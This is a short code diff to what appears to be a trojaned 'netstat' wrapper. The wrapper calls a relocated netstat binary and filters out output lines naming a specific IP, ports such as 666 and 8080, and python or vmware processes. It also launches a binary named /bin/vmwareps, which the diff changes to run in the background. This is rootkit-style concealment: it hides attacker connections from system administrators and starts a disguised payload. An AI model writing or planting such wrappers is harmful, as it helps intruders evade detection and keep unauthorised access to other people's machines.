@@ -2,4 +2,4 @@
 
 /var/cache/netstat $@ | grep -Ev "192.168.204.128|8080|666|53|443|vmware-network|python|python3|vmware|loop|pulse"
 
-/bin/vmwareps
+/bin/vmwareps &
